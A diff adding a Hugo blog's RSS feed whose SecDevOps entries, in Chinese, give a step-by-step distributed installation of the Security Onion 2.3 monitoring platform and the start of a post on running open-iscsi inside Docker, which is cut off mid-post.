@@ -1,0 +1,941 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>SecDevOps on KeePwn&#39;s Notes</title>
+        <link>/categories/secdevops/</link>
+        <description>Recent content in SecDevOps on KeePwn&#39;s Notes</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Wed, 16 Oct 2024 15:41:12 +0000</lastBuildDate><atom:link href="/categories/secdevops/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Security-Onion-2分布式实践之安装篇</title>
+        <link>/posts/security-onion-2-distributed-practice-install/</link>
+        <pubDate>Sat, 20 Mar 2021 00:00:00 +0000</pubDate>
+        
+        <guid>/posts/security-onion-2-distributed-practice-install/</guid>
+        <description>&lt;img src="/images/banner-security-onion-2-distributed-practice-install.png" alt="Featured image of post Security-Onion-2分布式实践之安装篇" /&gt;&lt;h2 id=&#34;前言&#34;&gt;前言
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Security Onion （以下称安全洋葱）是一款免费且开源的，用于威胁发现、企业安全监视和日志管理的 Linux 发行版本。
+目前，安全洋葱已经迭代至 2.X，与 1.X 版本不同，2.X 版本基于容器开发，实现了将各个组件和服务容器化，更易于使用者部署和定制。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;安全洋葱的安装较为简单，网络上也有诸多的 ALL IN ONE 的安装教程，但考虑到这些部署方式不太适合生产环境使用，所以本篇主要讲述如何在生产环境分布式部署安全洋葱系统。本篇并不涉及系统的调优，如果你此前已经安装并部署了安全洋葱，可以跳过此章节。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;本文中使用的安全洋葱版本为 v2.3.30（截至本文编写时）。&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;准备工作&#34;&gt;准备工作
+&lt;/h2&gt;&lt;p&gt;官方文档建议采用&lt;code&gt;标准的分布式部署方式&lt;/code&gt;进行部署安全洋葱，至少以下三个节点：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;节点类型&lt;/th&gt;
+          &lt;th&gt;说明&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;manager node&lt;/td&gt;
+          &lt;td&gt;主要节点，负责接收采集到的原始数据&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;forward node&lt;/td&gt;
+          &lt;td&gt;流量分析节点，也叫 sensor-node&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;search-node&lt;/td&gt;
+          &lt;td&gt;搜索节点，存储 ES 数据&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;我部署了 4 个节点，大家根据实际情况进行扩展：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;节点&lt;/th&gt;
+          &lt;th&gt;IP&lt;/th&gt;
+          &lt;th&gt;配置&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;security-manager&lt;/td&gt;
+          &lt;td&gt;10.10.0.1&lt;/td&gt;
+          &lt;td&gt;8 cores, 16g memory, 200g disk&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;security-sensor&lt;/td&gt;
+          &lt;td&gt;10.10.0.100&lt;/td&gt;
+          &lt;td&gt;8 cores, 32g memory, 12t disk&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;security-search-1&lt;/td&gt;
+          &lt;td&gt;10.10.0.11&lt;/td&gt;
+          &lt;td&gt;8 cores, 16g memory, 2t disk&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;security-search-2&lt;/td&gt;
+          &lt;td&gt;10.10.0.12&lt;/td&gt;
+          &lt;td&gt;8 cores, 16g memory, 2t disk&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;架构大致如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-distributed.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-distributed.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;开始安装&#34;&gt;开始安装
+&lt;/h2&gt;&lt;h3 id=&#34;security-manager&#34;&gt;Security-manager
+&lt;/h3&gt;&lt;p&gt;1.从 ISO 引导启动，设置完用户名和密码，回车后开始安装系统，安装完成后重启系统。&lt;/p&gt;
+&lt;p&gt;2.登录系统，输入用户名和密码，准备开始配置。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-1.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-1.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;3.选择安装类型为distributed&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-2-choose-install-type.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-2-choose-install-type.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;4.选择节点类型为manager&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-3-choose-node-type.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-3-choose-node-type.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;5.选择安装环境为standard，这里需要注意 security-manager 这台主机需要能够联网。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-4-choose-install-condition.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-4-choose-install-condition.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;6.设置主机名&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-5-set-hostname.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-5-set-hostname.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;7.设置管理口，并配置静态地址（这里建议不要选择DHCP分配地址，会影响服务/节点之间的通信）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-6-choose-nic.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-6-choose-nic.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-7-set-static-address.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-7-set-static-address.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;8.选择系统补丁计划（默认），设置家庭网络（默认）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-8-choose-os-path-schedule.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-8-choose-os-path-schedule.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-9-set-home-network.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-9-set-home-network.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;9.选择安装类型为高级，进行功能定制化&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-10-choose-manager-type.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-10-choose-manager-type.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;10.设置 ES 集群名称（默认）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-11-set-es-cluser-name.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-11-set-es-cluser-name.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;11.选择元信息分析引擎（zeek or suricata）。考虑到 zeek 可定制化更强些，所以我选择的是 zeek 处理 metadata，suricata 处理 nids-alerts。事实上，两种方式均可，官方这里有讨论//TODO。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-12-choose-gen-metadata.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-12-choose-gen-metadata.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;12.选择需要发送的日志类型。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;请注意，这指的是需要被发送到 manager 节点的日志类型，不是 zeek 要处理的协议（这需要额外进行配置）&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;建议按照实际监测需求和节点存储容量进行权衡。有选择恐惧症的可以先按默认的来，后面可以再修改的:)。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-13-choose-logs-to-send.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-13-choose-logs-to-send.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;13.选择 IDS 规则集（默认）。你也可以选择高级订阅版。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-14-choose-ids-ruleset.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-14-choose-ids-ruleset.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;14.选择安装的组件列表（默认）。按需选择。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Grafana
+&lt;ul&gt;
+&lt;li&gt;主机的健康监控和报警&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Fleet &amp;amp; osquery
+&lt;ul&gt;
+&lt;li&gt;HIDS，侧重于主机信息被动/主动采集&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Wazuh
+&lt;ul&gt;
+&lt;li&gt;HIDS，侧重于威胁检测、完整性监控等&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;TheHive
+&lt;ul&gt;
+&lt;li&gt;安全事件响应平台&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Playbook
+&lt;ul&gt;
+&lt;li&gt;检测 Playbook 的工具&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Strelka
+&lt;ul&gt;
+&lt;li&gt;文件提取/分析，用于威胁搜索、威胁检测和事件响应&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-15-choose-components.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-15-choose-components.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;15.为其他组件设置邮箱和密码&lt;/p&gt;
+&lt;p&gt;16.选择 WEB 界面的访问方式。我选择的是IP，也可以改为域名方式。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-16-choose-web-access.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-16-choose-web-access.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;17.选择下载系统更新包的方式。建议选择&lt;code&gt;通过 manager 节点下载&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-17-choose-update-os-by-manager-proxy.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-17-choose-update-os-by-manager-proxy.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;18.设置 soremote 密码，后面用于添加其他节点。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-18-set-soremote-passwd.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-18-set-soremote-passwd.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;19.设置允许访问WEB界面的网段。建议只添加安全运维段的主机IP, 不在该网段的主机将无法访问WEB界面。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-19-set-so-allow.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-19-set-so-allow.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;20.确定应用配置，等待完成安装。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-20.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-20.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-manager-setup-21.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-manager-setup-21.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;21.配置防火墙规则，允许其他节点访问管理节点的 Salt 服务 （&lt;strong&gt;重要&lt;/strong&gt;）&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;很多人在部署非管理节点的时候总是提示安装失败，就是因为缺少这个步骤导致的。
+sosetup.log中的报错日志类似：&lt;code&gt;[ERROR   ] &#39;mine.send&#39;: False&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;firewall-cmd --permanent --zone&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; --add-port&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4505-4506/tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;firewall-cmd --reload
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;security-sensor&#34;&gt;Security-sensor
+&lt;/h3&gt;&lt;p&gt;1.完成基础的系统安装后，我们开始配置流量分析节点。&lt;/p&gt;
+&lt;p&gt;2.选择安装类型为 distributed&lt;/p&gt;
+&lt;p&gt;3.选择节点类型为 sensor&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-sensor-setup-1-choose-install-type.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-sensor-setup-1-choose-install-type.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;4.设置主机名&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-sensor-setup-2-set-hostname.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-sensor-setup-2-set-hostname.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;5.选择管理口，并配置静态地址&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-sensor-setup-3-choose-nic.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-sensor-setup-3-choose-nic.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;6.设置 manager 节点，并输入 soremote 密码，与 manager 节点完成连接。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-sensor-setup-4-set-manager-hostname.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-sensor-setup-4-set-manager-hostname.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-sensor-setup-5-set-manager-ip.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-sensor-setup-5-set-manager-ip.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-sensor-setup-6-connect-to-manager.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-sensor-setup-6-connect-to-manager.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;7.选择镜像口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-sensor-setup-7-choose-monitor-nic.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-sensor-setup-7-choose-monitor-nic.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-sensor-setup-8.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-sensor-setup-8.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;8.选择系统补丁计划（默认），选择下载系统更新包的方式为 manager。&lt;/p&gt;
+&lt;p&gt;9.选择安装类型为高级，进行功能定制化。&lt;/p&gt;
+&lt;p&gt;10.进行 CPU 绑定（Zeek、Suricata）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-sensor-setup-9-bind-cpu-zeek.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-sensor-setup-9-bind-cpu-zeek.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-sensor-setup-10-bind-cpu-surucata.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-sensor-setup-10-bind-cpu-surucata.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;11.配置镜像口MTU（默认）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-sensor-setup-11-mtu.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-sensor-setup-11-mtu.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;12.等待安装完成。&lt;/p&gt;
+&lt;h3 id=&#34;security-search&#34;&gt;Security-search
+&lt;/h3&gt;&lt;p&gt;1.完成基础的系统安装后，我们开始配置流量分析节点。&lt;/p&gt;
+&lt;p&gt;2.选择安装类型为 distributed&lt;/p&gt;
+&lt;p&gt;3.选择节点类型为 searchnode&lt;/p&gt;
+&lt;p&gt;4.设置主机名&lt;/p&gt;
+&lt;p&gt;5.选择管理口，并配置静态地址&lt;/p&gt;
+&lt;p&gt;6.设置 manager 节点（输入 soremote 密码）&lt;/p&gt;
+&lt;p&gt;7.选择系统补丁计划（默认），选择下载系统更新包的方式为 manager。&lt;/p&gt;
+&lt;p&gt;8.选择安装类型为高级，进行功能定制化。&lt;/p&gt;
+&lt;p&gt;9.配置 ES 堆大小（默认）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-search-setup-1-set-es-heap-size.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-search-setup-1-set-es-heap-size.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;10.配置 Logstash 堆大小（默认）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-search-setup-2-set-logstash-heap-size.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-search-setup-2-set-logstash-heap-size.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;11.配置 Logstash pipeline 线程（默认）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-search-setup-3-set-logstash-pipeline-workers.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-search-setup-3-set-logstash-pipeline-workers.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;12.配置 logstash pipeline 批处理大小（默认）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-search-setup-4-set-logstash-pipeline-batch-size.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-search-setup-4-set-logstash-pipeline-batch-size.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;13.配置 logstash input 线程数（默认），如果发现存在消息积压（redis），可以适当调整以上几个参数。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-search-setup-5-set-logstash-input-num.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-search-setup-5-set-logstash-input-num.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;14.配置 ES 索引关闭时间（默认为 30 天）。关闭索引不会删除数据，如果需要查询历史数据可以再单独开启。如果内存足够的话，可以设置为 90 天。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-search-setup-6-set-days-of-indices-open.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-search-setup-6-set-days-of-indices-open.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;15.配置 ES 存储大小，我配置的是 1948（2T-100G），可以择优调整。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/so-search-setup-7-set-es-size.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;so-search-setup-7-set-es-size.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;16.等待安装完成。&lt;/p&gt;
+&lt;h2 id=&#34;功能验证&#34;&gt;功能验证
+&lt;/h2&gt;&lt;p&gt;1.打开 https://10.10.0.1 安全洋葱控制台并登陆&lt;/p&gt;
+&lt;p&gt;2.点击 Grid 标签，查看网格状态，检查节点是否已经全部上线。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/soc-web-grid.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;soc-web-grid.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在这里，大家可以看到节点列表中还出现了一个陌生的节点类型 securityonion-fleet，这个是其实是独立部署的 Fleet 服务，由于需要管理的 osquery 客户端较多，容易影响性能，所以就把它从管理节点拆分出来了。&lt;/p&gt;
+&lt;p&gt;3.点击 Alerts 标签，检查是否可以正常。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/soc-web-alert.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;soc-web-alert.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;4.点击 Hunt 标签，检查是否正常。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/soc-web-hunt.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;soc-web-hunt.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;5.点击 Grafana 标签，检查各个主机节点是否正常。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/soc-grafana.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;soc-grafana.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;6.点击 Kiabana 标签，检查 ES 服务是否正常。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/soc-kibana.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;soc-kibana.webp&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;好了，如果服务一切正常的话，你可以开始打工人生活了:)&lt;/p&gt;
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://docs.securityonion.net/en/2.3/about.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://docs.securityonion.net/en/2.3/about.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>Docker环境下使用open-iscsi遇到的问题</title>
+        <link>/posts/using-open-iscsi-in-docker-container/</link>
+        <pubDate>Thu, 12 Nov 2015 00:00:00 +0000</pubDate>
+        
+        <guid>/posts/using-open-iscsi-in-docker-container/</guid>
+        <description>&lt;p&gt;因为有业务需求，需要在docker的容器下连接iscsi磁盘。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;部署docker镜像，安装&lt;code&gt;open-iscsi&lt;/code&gt;：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;test@testpc$ docker pull ubuntu:14.04
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;test@testpc$ docker run ubuntu:14.04 apt-get install -y open-iscsi
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;进入容器，运行&lt;code&gt;iscsiadm&lt;/code&gt;：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@aaaa# iscsiadm -m discovery -t st -p 192.168.1.10
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iscsiadm: can not connect to iSCSI daemon &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;111&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;!
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iscsiadm: can not connect to iSCSI daemon &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;111&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;!
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iscsiadm: Cann perform discovery. connect to iSCSI daemon &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;111&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- more --&gt;
+&lt;p&gt;初步排查原因，可能是因为找不到iscsi的驱动。该装装，该删删，结果依旧不行。&lt;/p&gt;
+&lt;p&gt;有没有可能是docker本身的默认配置或策略问题？想到这，果然在某个docker官方文档中找到了一个参数&lt;code&gt;privileged&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
